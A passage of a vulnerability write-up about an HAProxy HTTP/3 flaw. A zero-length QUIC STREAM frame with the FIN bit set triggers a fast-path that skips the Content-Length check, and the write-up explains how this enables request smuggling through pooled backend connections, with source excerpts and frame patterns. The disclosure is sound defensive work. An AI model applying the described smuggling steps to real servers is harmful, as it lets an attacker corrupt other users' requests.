+<p>QUIC is not “a better TCP.” It is a Trojan horse: a transport hidden inside UDP, deployed from user space, encrypted so the ecosystem cannot calcify it a second time. For an attacker, the relevant consequence is that QUIC shipped in production at scale within a handful of years — and HAProxy’s QUIC stack is only a few years old, hand-rolled C code bridging a protocol that browsers and servers are still actively iterating on. New attack surface by construction.</p>
+
+<h3 id="27-a-quic-packet-on-the-wire">2.7 A QUIC packet on the wire</h3>
+
+<p>Let’s make this concrete. Here’s a single UDP datagram carrying a QUIC packet with two STREAM frames for two different HTTP requests:</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/quic-packet-structure.svg" alt="QUIC packet structure: header plus multiple frames for different streams." /></p>
+
+<h3 id="28-offset-the-tape-metaphor">2.8 Offset: the tape metaphor</h3>
+
+<p>Think of each QUIC stream as a <strong>tape</strong> — a long roll where you write bytes left to right.</p>
+
+<p><strong>Offset</strong> = “where on the tape these bytes start”
+<strong>Length</strong> = “how many bytes I’m writing”</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/quic-stream-tape.svg" alt="Stream tape metaphor: a STREAM frame with offset 0 and length 500 placed on the tape." /></p>
+
+<p>The offset is QUIC’s equivalent of TCP’s sequence numbers — but it lives explicitly in each STREAM frame instead of hidden in the kernel. That’s what lets QUIC handle out-of-order delivery: if a frame with offset 500 arrives before the one with offset 0, QUIC knows there’s a gap and can wait for the missing piece without blocking other streams.</p>
+
+<h3 id="29-the-fin-bit-one-bit-wrong-layer">2.9 The FIN bit: one bit, wrong layer</h3>
+
+<p>Each STREAM frame has a <strong>FIN</strong> bit. When set, it means: “this stream is done. No more data will ever be sent on this stream.”</p>
+
+<p>FIN is not a separate frame or field — it’s a single bit inside the <strong>first byte</strong> of the STREAM frame, the byte that identifies the frame type. To see how this works, let’s zoom in on the frame’s anatomy.</p>
+
+<p>The STREAM frame structure (<a href="https://datatracker.ietf.org/doc/html/rfc9000#section-19.8">RFC 9000 §19.8</a>) is a Type byte followed by Stream ID, optional Offset, optional Length, and the application data. The diagram below shows the field layout on top and what’s inside the Type byte underneath:</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/quic-stream-frame-anatomy.svg" alt="STREAM frame structure: top row shows the field layout, bottom row zooms into the Type byte to reveal the OFF/LEN/FIN flag bits." /></p>
+
+<p>The combination that matters for the bug is the last line: a Type byte of <code class="language-plaintext highlighter-rouge">0x0d</code> means an Offset is present, no Length is present, and the stream is finished. Because LEN is 0, the Stream Data runs to the end of the packet — which can be (and for this attack, is) <strong>zero bytes</strong>.</p>
+
+<p>Here’s what such a frame looks like on the wire:</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/quic-standalone-fin-wire.svg" alt="FIN-only STREAM frame on the wire: 3 fields totaling about 4 bytes, with zero application payload." /></p>
+
+<p>Those ~4 bytes are all <strong>QUIC framing overhead</strong>. The application payload — what the H3 parser actually sees — is <strong>zero bytes</strong>. This is the heart of the bug.</p>
+
+<p>Contrast with HTTP/2. There, ending a stream requires the <code class="language-plaintext highlighter-rouge">END_STREAM</code> flag on a DATA or HEADERS frame. Even an “empty DATA frame with END_STREAM” carries <strong>9 bytes of H/2 header</strong> on the wire, and those 9 bytes are <strong>application payload</strong> from the TCP layer’s perspective — TCP doesn’t know H/2 streams exist. There is no such thing as “close the stream at the transport without sending application bytes” in HTTP/2. The concept doesn’t exist because the transport doesn’t know streams exist.</p>
+
+<p><strong>In HTTP/3, the FIN lives at the transport layer</strong> (QUIC), not at the application layer (H3). An attacker with a QUIC library can craft a raw STREAM frame with <code class="language-plaintext highlighter-rouge">len=0, FIN=1</code> that carries zero bytes to the H3 parser. This is something HTTP/2’s design makes impossible.</p>
+
+<hr />
+
+<h2 id="3-the-bug">3. The bug</h2>
+
+<blockquote>
+  <p>Please note that the source code analysis was performed using Claude Code Opus 4.6, manually verified through local lab tests, and later confirmed by the vendor.</p>
+</blockquote>
+
+<h3 id="31-from-wire-to-h3_rcv_buf">3.1 From wire to h3_rcv_buf</h3>
+
+<p>Before we look at the bug, we need a mental model of the HAProxy data path. When a UDP datagram arrives, it travels through this pipeline:</p>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/haproxy-quic-pipeline.svg" alt="Pipeline: UDP socket buffer to h3_rcv_buf, with batching stages annotated." /></p>
+
+<p>The full source-level walkthrough — DCID lookup against a per-thread tree, header-protection removal, EB-tree queueing by packet number, AEAD decryption, frame parsing, per-stream non-contiguous buffer (ncb) inserts — is interesting but not strictly necessary for understanding the bug. Three properties of this pipeline are:</p>
+
+<ol>
+  <li>
+    <p><strong>The FIN bit travels as stream state, not as a per-call argument.</strong> When a STREAM frame with FIN arrives, <code class="language-plaintext highlighter-rouge">qcc_recv</code> (<code class="language-plaintext highlighter-rouge">src/mux_quic.c:1805</code>) sets <code class="language-plaintext highlighter-rouge">qcs-&gt;flags |= QC_SF_SIZE_KNOWN</code> and transitions the stream state via <code class="language-plaintext highlighter-rouge">qcs_close_remote()</code>. From that point on, anything reading the stream sees <code class="language-plaintext highlighter-rouge">qcs_is_close_remote() == true</code>. The <code class="language-plaintext highlighter-rouge">fin</code> argument the H3 parser later receives is derived from this stream state — <em>not</em> from “this specific call corresponds to a frame that had FIN set.”</p>
+  </li>
+  <li>
+    <p><strong><code class="language-plaintext highlighter-rouge">h3_rcv_buf()</code> is called once per STREAM frame</strong>, synchronously, inside <code class="language-plaintext highlighter-rouge">qcc_recv</code>’s dispatch loop (<code class="language-plaintext highlighter-rouge">qcc_decode_qcs</code>, <code class="language-plaintext highlighter-rouge">src/mux_quic.c:1326</code>). Whether two STREAM frames arrive coalesced in the same UDP datagram, in back-to-back datagrams, or 300 ms apart, each one produces its own call with its own <code class="language-plaintext highlighter-rouge">(b, fin)</code> snapshot. The batching at every earlier stage is transparent to H3. <strong>Timing is irrelevant; only the shape of the STREAM frames matters.</strong></p>
+  </li>
+  <li>
+    <p><strong>The <code class="language-plaintext highlighter-rouge">b</code> buffer passed to <code class="language-plaintext highlighter-rouge">h3_rcv_buf</code> is an alias over the per-stream ncb, not a copy.</strong> <code class="language-plaintext highlighter-rouge">b.data</code> reflects the count of contiguous bytes currently readable — zero if nothing arrived, zero if a previous call already consumed everything, zero if no rxbuf was ever allocated (e.g. a standalone-FIN at offset 0 produces <code class="language-plaintext highlighter-rouge">BUF_NULL</code>).</p>
+  </li>
+</ol>
+
+<p>Together these three properties mean: by the time <code class="language-plaintext highlighter-rouge">h3_rcv_buf</code> runs, it cannot distinguish whether <code class="language-plaintext highlighter-rouge">(b = empty, fin = 1)</code> was caused by “FIN just arrived in this call,” “FIN arrived earlier and the data was consumed,” or “FIN arrived first with no data ever sent.” It only sees the conjunction. The bug lives in this ambiguity.</p>
+
+<h3 id="32-two-layers-two-notions-of-done">3.2 Two layers, two notions of “done”</h3>
+
+<p>At the <strong>QUIC layer</strong>, a stream FIN means “no more bytes on this stream, ever.”</p>
+
+<p>At the <strong>H3 layer</strong>, end of message means “all H3 frames have been parsed, and the body length matches <code class="language-plaintext highlighter-rouge">Content-Length</code>.”</p>
+
+<p>These events <em>usually</em> coincide. But they don’t <em>have to</em>. A QUIC peer can close a stream with FIN after sending headers but before sending the body. At the QUIC layer, that’s perfectly valid — “I’m done sending.” At the H3 layer, that’s invalid — “you declared <code class="language-plaintext highlighter-rouge">Content-Length: 5</code> but sent 0 body bytes.”</p>
+
+<p>The job of <code class="language-plaintext highlighter-rouge">h3.c</code> is to enforce H3 semantics on top of QUIC transport. It has code to do exactly this. One path skips it.</p>
+
+<h3 id="33-the-htx-trust-boundary">3.3 The HTX trust boundary</h3>
+
+<p>Before the bug itself, one more piece. Once the H3 layer has parsed a complete request, it emits an <strong>HTX message</strong> — HAProxy’s protocol-agnostic internal representation. The key flag is <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code> (End Of Message): when set, it tells every downstream consumer “this message is complete.”</p>
+
+<p>The backend H1 mux (<code class="language-plaintext highlighter-rouge">src/mux_h1.c</code>) receives HTX and serializes it to HTTP/1.1 on a TCP socket toward the origin. The H1 mux transitions through several states (<code class="language-plaintext highlighter-rouge">H1_MSG_HDR_FIRST</code>, <code class="language-plaintext highlighter-rouge">H1_MSG_DATA</code>, <code class="language-plaintext highlighter-rouge">H1_MSG_DONE</code>, …); the transition to <code class="language-plaintext highlighter-rouge">H1_MSG_DONE</code> happens at multiple points in the encoder, but the relevant one for our scenario is in the body-emission path (<code class="language-plaintext highlighter-rouge">mux_h1.c:2987-2999</code>):</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">else</span> <span class="nf">if</span> <span class="p">(</span><span class="n">htx_is_unique_blk</span><span class="p">(</span><span class="n">htx</span><span class="p">,</span> <span class="n">blk</span><span class="p">)</span> <span class="o">&amp;&amp;</span>
+         <span class="p">((</span><span class="n">htx</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">HTX_FL_EOM</span><span class="p">)</span> <span class="o">||</span> <span class="p">((</span><span class="n">h1m</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">H1_MF_CLEN</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="n">h1m</span><span class="o">-&gt;</span><span class="n">curr_len</span><span class="p">)))</span> <span class="p">{</span>
+    <span class="cm">/* EOM flag is set and it is the last block or there is no payload. */</span>
+    <span class="p">...</span>
+    <span class="n">h1m</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">=</span> <span class="p">((</span><span class="n">htx</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">HTX_FL_EOM</span><span class="p">)</span> <span class="o">?</span> <span class="n">H1_MSG_DONE</span> <span class="o">:</span> <span class="n">H1_MSG_TRAILERS</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Two separate conditions can put H1 into <code class="language-plaintext highlighter-rouge">MSG_DONE</code>: either upstream set <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code>, <strong>or</strong> the declared <code class="language-plaintext highlighter-rouge">Content-Length</code> (<code class="language-plaintext highlighter-rouge">H1_MF_CLEN</code>) has been fully consumed (<code class="language-plaintext highlighter-rouge">curr_len</code> reached zero). In the bug scenario, the H3 fast-path sets <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code> while <code class="language-plaintext highlighter-rouge">curr_len</code> is still non-zero — so the EOM branch fires, the request is considered complete, and the H1 mux moves on without ever waiting for the missing body bytes that <code class="language-plaintext highlighter-rouge">Content-Length</code> had announced.</p>
+
+<p>This isn’t a bug in <code class="language-plaintext highlighter-rouge">mux_h1</code>. It’s a <strong>trust boundary</strong>: when H3 emits <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code>, mux_h1 takes that as a binding statement that the message is complete and acts on it without re-deriving completion from the body length it forwarded. The H1 mux can’t second-guess every upstream mux — if the HTX contract is violated, the bug is in whoever set <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code> without earning the right to.</p>
+
+<h3 id="34-where-haproxy-validates-body-size">3.4 Where HAProxy validates body size</h3>
+
+<p><code class="language-plaintext highlighter-rouge">src/h3.c</code> has a body-size validator:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* src/h3.c — h3_check_body_size(), lines 447-479 */</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="nf">h3_check_body_size</span><span class="p">(</span><span class="k">struct</span> <span class="n">qcs</span> <span class="o">*</span><span class="n">qcs</span><span class="p">,</span> <span class="kt">int</span> <span class="n">fin</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">h3s</span> <span class="o">*</span><span class="n">h3s</span> <span class="o">=</span> <span class="n">qcs</span><span class="o">-&gt;</span><span class="n">ctx</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">h3s</span><span class="o">-&gt;</span><span class="n">data_len</span> <span class="o">&gt;</span> <span class="n">h3s</span><span class="o">-&gt;</span><span class="n">body_len</span> <span class="o">||</span>
+        <span class="p">(</span><span class="n">fin</span> <span class="o">&amp;&amp;</span> <span class="n">h3s</span><span class="o">-&gt;</span><span class="n">data_len</span> <span class="o">&lt;</span> <span class="n">h3s</span><span class="o">-&gt;</span><span class="n">body_len</span><span class="p">))</span> <span class="p">{</span>
+        <span class="cm">/* Content-Length mismatch — reject as malformed */</span>
+        <span class="n">h3s</span><span class="o">-&gt;</span><span class="n">err</span> <span class="o">=</span> <span class="n">H3_ERR_MESSAGE_ERROR</span><span class="p">;</span>
+        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>If <code class="language-plaintext highlighter-rouge">fin</code> is set and we received fewer body bytes than declared in <code class="language-plaintext highlighter-rouge">Content-Length</code>, reject as malformed. This is the <a href="https://datatracker.ietf.org/doc/html/rfc9114#section-4.1.2">RFC 9114 §4.1.2</a> check.</p>
+
+<p>This function is called inside the DATA-frame parsing loop in <code class="language-plaintext highlighter-rouge">h3_rcv_buf()</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* src/h3.c — h3_rcv_buf(), the normal path */</span>
+<span class="k">while</span> <span class="p">(</span><span class="n">b_data</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">...)</span> <span class="p">{</span>
+    <span class="cm">/* parse H3 frames one at a time */</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">ftype</span> <span class="o">==</span> <span class="n">H3_FT_DATA</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">h3s</span><span class="o">-&gt;</span><span class="n">data_len</span> <span class="o">+=</span> <span class="n">flen</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">h3s</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">H3_SF_HAVE_CLEN</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">h3_check_body_size</span><span class="p">(</span><span class="n">qcs</span><span class="p">,</span> <span class="p">...))</span>    <span class="c1">// ← THE CHECK</span>
+                <span class="k">break</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">while</code> loop condition includes <code class="language-plaintext highlighter-rouge">b_data(b)</code> — “while there are bytes in the buffer.” As long as there’s data to parse, the validator runs.</p>
+
+<h3 id="35-the-fast-path-that-skips-it">3.5 The fast-path that skips it</h3>
+
+<p>But right before that <code class="language-plaintext highlighter-rouge">while</code> loop, there’s a fast-path:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* src/h3.c — h3_rcv_buf(), line ~1746 */</span>
+<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">b_data</span><span class="p">(</span><span class="n">b</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">fin</span> <span class="o">&amp;&amp;</span> <span class="n">quic_stream_is_bidi</span><span class="p">(</span><span class="n">qcs</span><span class="o">-&gt;</span><span class="n">id</span><span class="p">))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">qcs_http_handle_standalone_fin</span><span class="p">(</span><span class="n">qcs</span><span class="p">))</span> <span class="p">{</span>
+        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">goto</span> <span class="n">done</span><span class="p">;</span>    <span class="c1">// ← SKIPS THE ENTIRE while LOOP</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Reading the condition:</p>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">!b_data(b)</code> — the buffer is empty (zero application bytes — see property 3 in §3.1).</li>
+  <li><code class="language-plaintext highlighter-rouge">fin</code> — the stream is remotely closed (see property 1 in §3.1).</li>
+  <li><code class="language-plaintext highlighter-rouge">quic_stream_is_bidi()</code> — this is a bidirectional stream (HTTP requests always are).</li>
+</ul>
+
+<p>If all three hold, <code class="language-plaintext highlighter-rouge">qcs_http_handle_standalone_fin()</code> runs and control jumps to <code class="language-plaintext highlighter-rouge">done</code>. The <code class="language-plaintext highlighter-rouge">while</code> loop with <code class="language-plaintext highlighter-rouge">h3_check_body_size()</code> <strong>never executes</strong>.</p>
+
+<p>What does <code class="language-plaintext highlighter-rouge">qcs_http_handle_standalone_fin()</code> do? Here is the actual implementation from <code class="language-plaintext highlighter-rouge">src/qmux_http.c:67-86</code>:</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">qcs_http_handle_standalone_fin</span><span class="p">(</span><span class="k">struct</span> <span class="n">qcs</span> <span class="o">*</span><span class="n">qcs</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">struct</span> <span class="n">buffer</span> <span class="o">*</span><span class="n">appbuf</span><span class="p">;</span>
+    <span class="k">struct</span> <span class="n">htx</span> <span class="o">*</span><span class="n">htx</span><span class="p">;</span>
+    <span class="kt">int</span> <span class="n">eom</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">appbuf</span> <span class="o">=</span> <span class="n">qcc_get_stream_rxbuf</span><span class="p">(</span><span class="n">qcs</span><span class="p">)))</span>
+        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
+
+    <span class="n">htx</span> <span class="o">=</span> <span class="n">htx_from_buf</span><span class="p">(</span><span class="n">appbuf</span><span class="p">);</span>
+    <span class="n">eom</span> <span class="o">=</span> <span class="n">htx_set_eom</span><span class="p">(</span><span class="n">htx</span><span class="p">);</span>
+    <span class="n">htx_to_buf</span><span class="p">(</span><span class="n">htx</span><span class="p">,</span> <span class="n">appbuf</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">eom</span><span class="p">)</span>
+        <span class="k">goto</span> <span class="n">err</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+ <span class="nl">err:</span>
+    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>The relevant call is <code class="language-plaintext highlighter-rouge">htx_set_eom(htx)</code>, which sets the <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code> flag on the HTX message (and inserts an empty <code class="language-plaintext highlighter-rouge">HTX_BLK_EOT</code> block if the HTX is empty, so the EOM flag has something to attach to). No validation. No check that <code class="language-plaintext highlighter-rouge">Content-Length</code> matches <code class="language-plaintext highlighter-rouge">data_len</code>. It takes the client’s word for it.</p>
+
+<p><strong>This is the bug.</strong> The shortcut sets the “message complete” flag without verifying that the message is actually complete. As the HAProxy maintainer wrote in the fix commit message: <em>“this shortcut bypasses an important HTTP/3 validation check on the received body size vs the announced content-length header.”</em></p>
+
+<h3 id="36-when-does-the-fast-path-trigger-back-to-the-protocol">3.6 When does the fast-path trigger? Back to the protocol</h3>
+
+<p>From §2.9 and §3.1, the entry condition <code class="language-plaintext highlighter-rouge">!b_data(b) &amp;&amp; fin &amp;&amp; quic_stream_is_bidi(qcs-&gt;id)</code> is reached in exactly one physical circumstance: a STREAM frame has just been handed to the dispatcher with <code class="language-plaintext highlighter-rouge">fin = 1</code> and the per-stream buffer contains zero bytes — either because no application data was ever received, or because earlier calls of <code class="language-plaintext highlighter-rouge">h3_rcv_buf</code> already consumed everything that had arrived. <strong>What determines whether that activation is legitimate or malicious is the one thing the fast-path never asks: does <code class="language-plaintext highlighter-rouge">data_len</code> match the declared <code class="language-plaintext highlighter-rouge">Content-Length</code>?</strong></p>
+
+<p>The table below enumerates the five client patterns that can reach the dispatcher for a request-carrying bidi stream. The notation <code class="language-plaintext highlighter-rouge">{…}</code> denotes a single QUIC STREAM frame; the symbols inside are the H3 frames it carries (<code class="language-plaintext highlighter-rouge">HEADERS</code>, <code class="language-plaintext highlighter-rouge">DATA(n)</code> where <code class="language-plaintext highlighter-rouge">n</code> is the DATA frame payload length), plus the QUIC <code class="language-plaintext highlighter-rouge">FIN</code> bit on the STREAM frame itself. <code class="language-plaintext highlighter-rouge">body_len</code> is the value declared in <code class="language-plaintext highlighter-rouge">Content-Length</code>; <code class="language-plaintext highlighter-rouge">data_len</code> is the running count of DATA-frame payload bytes the H3 layer has seen so far (maintained at <code class="language-plaintext highlighter-rouge">src/h3.c:1782</code>).</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>#</th>
+      <th>Client sends</th>
+      <th><code class="language-plaintext highlighter-rouge">data_len</code> vs <code class="language-plaintext highlighter-rouge">body_len</code> on last call</th>
+      <th>Fast-path triggers?</th>
+      <th>Validator runs?</th>
+      <th>Outcome</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td><code class="language-plaintext highlighter-rouge">{HEADERS + DATA(body) + FIN}</code></td>
+      <td><code class="language-plaintext highlighter-rouge">=</code></td>
+      <td>no — buffer has DATA</td>
+      <td>yes, in DATA loop</td>
+      <td>✓ legitimate (✗ if mismatched)</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td><code class="language-plaintext highlighter-rouge">{HEADERS}</code> + <code class="language-plaintext highlighter-rouge">{DATA(body) + FIN}</code></td>
+      <td><code class="language-plaintext highlighter-rouge">=</code></td>
+      <td>no — buffer has DATA on frame 2</td>
+      <td>yes, in DATA loop</td>
+      <td>✓ legitimate (✗ if mismatched)</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td><code class="language-plaintext highlighter-rouge">{HEADERS}</code> + <code class="language-plaintext highlighter-rouge">{DATA(body)}</code> + <code class="language-plaintext highlighter-rouge">{len=0, FIN}</code></td>
+      <td><code class="language-plaintext highlighter-rouge">=</code></td>
+      <td><strong>yes</strong>, on frame 3</td>
+      <td><strong>no</strong> — skipped</td>
+      <td>✓ legitimate (by coincidence)</td>
+    </tr>
+    <tr>
+      <td>4</td>
+      <td><code class="language-plaintext highlighter-rouge">{HEADERS}</code> + <code class="language-plaintext highlighter-rouge">{DATA(partial)}</code> + <code class="language-plaintext highlighter-rouge">{len=0, FIN}</code></td>
+      <td><code class="language-plaintext highlighter-rouge">&lt;</code></td>
+      <td><strong>yes</strong>, on frame 3</td>
+      <td><strong>no</strong> — skipped</td>
+      <td>✗ <strong>smuggled</strong> (partial body)</td>
+    </tr>
+    <tr>
+      <td>5</td>
+      <td><code class="language-plaintext highlighter-rouge">{HEADERS}</code> + <code class="language-plaintext highlighter-rouge">{len=0, FIN}</code></td>
+      <td><code class="language-plaintext highlighter-rouge">0 &lt;</code></td>
+      <td><strong>yes</strong>, on frame 2</td>
+      <td><strong>no</strong> — skipped</td>
+      <td>✗ <strong>smuggled</strong> (empty body)</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The correlation the table makes visible is the bug in one line: <strong>fast-path triggers ⇔ validator is skipped</strong>. The trigger condition depends only on the transport-level shape of the frames (<code class="language-plaintext highlighter-rouge">!b_data(b) &amp;&amp; fin</code>), while the distinction between legitimate and malicious traffic lives one layer up, in the H3 counters <code class="language-plaintext highlighter-rouge">data_len</code> and <code class="language-plaintext highlighter-rouge">body_len</code> that the fast-path never consults.</p>
+
+<p>The fast-path is not an accident of design. Row 3 is a legitimate pattern permitted by <a href="https://datatracker.ietf.org/doc/html/rfc9000#section-19.8">RFC 9000 §19.8</a> — a STREAM frame may carry zero bytes so long as it sets the FIN bit. And the dispatch loop in <code class="language-plaintext highlighter-rouge">qcc_recv</code> (<code class="language-plaintext highlighter-rouge">src/mux_quic.c:1965-1976</code>) re-enters <code class="language-plaintext highlighter-rouge">qcc_decode_qcs</code> only on two events: new application bytes become available, <strong>or</strong> <code class="language-plaintext highlighter-rouge">fin_standalone &amp;&amp; qcs_is_close_remote(qcs)</code> holds. For a row-3 request, by the time the empty-FIN STREAM frame is processed the earlier DATA has already been consumed and the buffer is empty; the only way <code class="language-plaintext highlighter-rouge">h3_rcv_buf</code> sees the close signal at all is through the <code class="language-plaintext highlighter-rouge">fin_standalone</code> branch — which is exactly the branch that triggers the fast-path. Without this shortcut the request would hang at EOM forever. The fix commit from Amaury Denoyelle describes the history as <em>“this situation is tedious to handle and haproxy parsing code has changed several times to deal with it”</em> — the shortcut is the current form.</p>
+
+<p><strong>The bug is that the shortcut conflates two facts that look identical on the wire but aren’t semantically equivalent</strong>: “the QUIC stream is closed and the buffer is empty” ≠ “the HTTP message is complete.” Those facts coincide only when <code class="language-plaintext highlighter-rouge">data_len == body_len</code> at the moment the FIN arrives. The pre-fix code never compared the two on this path. Quoting the same commit verbatim: <em>“this shortcut bypasses an important HTTP/3 validation check on the received body size vs the announced content-length header. Under some conditions, this could cause a desynchronization with the backend server which could be exploited for request smuggling.”</em></p>
+
+<p>This generalizes rows 4 and 5: they are the same bug expressed with different body amounts. <strong>Any pattern where a standalone-FIN arrives while <code class="language-plaintext highlighter-rouge">data_len &lt; body_len</code> and <code class="language-plaintext highlighter-rouge">Content-Length</code> was declared smuggles.</strong> The exploit in §4.2 uses row 5 because it produces maximal mismatch with minimal traffic — zero body bytes against a declared <code class="language-plaintext highlighter-rouge">Content-Length: N</code> of the attacker’s choice. Row 4 (<code class="language-plaintext highlighter-rouge">Content-Length: 5</code>, a DATA frame with 3 bytes, then a separate empty-FIN) is equally exploitable and looks more like organic traffic on the wire — a request that appears to be merely truncated by network instability. The table’s fourth row is the unlucky cousin of row 3.</p>
+
+<p>One precondition constrains the attack: the request must declare <code class="language-plaintext highlighter-rouge">Content-Length</code>. <code class="language-plaintext highlighter-rouge">h3_check_body_size</code> is gated by <code class="language-plaintext highlighter-rouge">H3_SF_HAVE_CLEN</code> — the function begins with <code class="language-plaintext highlighter-rouge">BUG_ON(!(h3s-&gt;flags &amp; H3_SF_HAVE_CLEN))</code> at <code class="language-plaintext highlighter-rouge">src/h3.c:454</code> — and the fast-path emits EOM without ever consulting either counter. A request with no <code class="language-plaintext highlighter-rouge">Content-Length</code> has <code class="language-plaintext highlighter-rouge">body_len = 0</code> and effectively no body contract to violate. POST requests with declared bodies are the natural target anyway: the smuggling primitive depends on the backend reserving room for body bytes that never arrive, and no body means no reservation.</p>
+
+<p>The contrast with HTTP/2 (already built up in §2.9) lands here as a one-line summary: in H/2 an <code class="language-plaintext highlighter-rouge">END_STREAM</code> always rides on a DATA or HEADERS frame and therefore always carries at least 9 bytes of application payload through the H/2 parser — there is no transport-level “close without payload” primitive. In HTTP/3 there is, and the fast-path condition <code class="language-plaintext highlighter-rouge">!b_data(b) &amp;&amp; fin</code> is exactly what recognizes it.</p>
+
+<p>Two properties of the resulting bug are worth pinning down before we move to the exploit:</p>
+
+<ul>
+  <li>
+    <p><strong>The attack is deterministic, not racy.</strong> From §3.1, <code class="language-plaintext highlighter-rouge">h3_rcv_buf()</code> runs once per STREAM frame regardless of upstream batching. Whether the attacker sends the HEADERS and the standalone-FIN in the same UDP datagram, in back-to-back datagrams, or 300 ms apart, each STREAM frame produces an isolated call with its own <code class="language-plaintext highlighter-rouge">(b, fin)</code> snapshot and the dispatcher arrives at <code class="language-plaintext highlighter-rouge">(b = empty, fin = 1)</code> on the FIN call either way. No race, no timing window.</p>
+  </li>
+  <li>
+    <p><strong>The bug lives in the gap between two layers.</strong> The H3 layer writes <code class="language-plaintext highlighter-rouge">HTX_FL_EOM</code> into the HTX on a code path that never compared <code class="language-plaintext highlighter-rouge">data_len</code> against <code class="language-plaintext highlighter-rouge">body_len</code>. The downstream H1 mux takes that flag as a binding assertion (§3.3) and never re-derives completion from <code class="language-plaintext highlighter-rouge">curr_len</code>. Neither layer is individually wrong — each acts on information the other was supposed to validate. The fast-path is the place the contract breaks.</p>
+  </li>
+</ul>
+
+<hr />
+
+<h2 id="4-the-exploit">4. The exploit</h2>
+
+<h3 id="41-the-connection-pool-problem">4.1 The connection pool problem</h3>
+
+<p>HAProxy is a reverse proxy. It sits between clients and backends. To save resources, HAProxy <strong>reuses</strong> TCP connections to the backend: after serving user A’s request, the same TCP socket can be used for user B’s request. This is the “backend connection pool.”</p>
+
+<p>The smuggling works like this:</p>
+
+<ol>
+  <li>Attacker sends a POST with <code class="language-plaintext highlighter-rouge">Content-Length: 5</code> but zero body bytes (via the FIN bug).</li>
+  <li>HAProxy forwards <code class="language-plaintext highlighter-rouge">POST /photos HTTP/1.1\r\nContent-Length: 5\r\n\r\n</code> (with zero body) to the backend over TCP.</li>
+  <li>The backend (nginx) sends a <code class="language-plaintext highlighter-rouge">301 Moved Permanently</code> — a redirect because <code class="language-plaintext highlighter-rouge">/photos</code> is a directory without a trailing slash. This is an “early response”: nginx replies before consuming the body.</li>
+  <li>HAProxy receives the 301, marks the request as done (<code class="language-plaintext highlighter-rouge">H1_MSG_DONE</code>), and <strong>returns the TCP connection to the pool</strong>. But nginx is still expecting 5 body bytes.</li>
+  <li>A victim’s request gets assigned to that same pooled TCP connection.</li>
+  <li>Nginx reads the first 5 bytes of the victim’s request as the missing body. The rest gets parsed as a new HTTP request → 400 Bad Request.</li>
+</ol>
+
+<p><img src="/assets/2026-04-14-haproxy-h3-standalone-fin-smuggling/smuggling-desync-sequence.svg" alt="Desync sequence: attacker poisons the pooled backend connection; victim's request gets corrupted." /></p>
+
